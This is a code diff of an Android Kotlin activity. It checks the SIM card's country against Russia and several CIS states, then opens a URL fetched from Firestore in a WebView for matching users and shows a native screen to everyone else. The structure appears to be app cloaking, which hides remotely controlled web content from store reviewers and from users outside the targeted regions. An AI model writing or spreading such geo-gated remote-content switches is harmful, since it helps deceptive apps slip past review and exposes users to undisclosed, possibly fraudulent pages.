@@ -1,20 +1,10 @@
 package com.testfirebaseapp
 
-import android.Manifest.permission
-import android.annotation.TargetApi
-import android.content.DialogInterface
 import android.content.Intent
-import android.content.pm.PackageManager
-import android.os.Build
 import android.os.Bundle
 import android.util.Log
 import android.view.View
-import android.view.Window
-import android.view.WindowManager
-import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 import androidx.lifecycle.ViewModelProvider
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.FirebaseFirestoreSettings
@@ -64,25 +54,15 @@ class MainActivity : AppCompatActivity() {
         val list = acces_to_sim(this)
         val country = listOf(
             "ru",
-            "rus",
             "az",
-            "aze",
             "am",
-            "arm",
             "by",
-            "blr",
             "kz",
-            "kaz",
             "kg",
-            "kgz",
             "md",
-            "mda",
             "tj",
-            "tjk",
-            "uz",
-            "uzb"
+            "uz"
         )
-
         return list[0].isNotEmpty() && country.contains(list[1].toLowerCase())
 
     }
@@ -99,6 +79,7 @@ class MainActivity : AppCompatActivity() {
         db.collection("data")
             .get()
             .addOnCompleteListener { task ->
+
                 if (task.isSuccessful) {
                     for (document in task.result!!) {
                         if (document.data["value"].toString().length>1) {
@@ -106,10 +87,11 @@ class MainActivity : AppCompatActivity() {
                             openWebView("" + document.data["value"])
                         }
                     }
-                    if (!isLoaded) loadNative()
                 }
+                if (!isLoaded) loadNative()
+            }.addOnFailureListener {
+                loadNative()
             }
-        if (!isLoaded) loadNative()
 
     }
 
@@ -117,6 +99,7 @@ class MainActivity : AppCompatActivity() {
     private fun checkPermission() {
         if (simCardInfo()) {
             dataFromFireBase()
+            Log.e("N@@check","bitb")
         } else {
             loadNative()
         }
@@ -128,3 +111,4 @@ class MainActivity : AppCompatActivity() {
 
 
 }
+
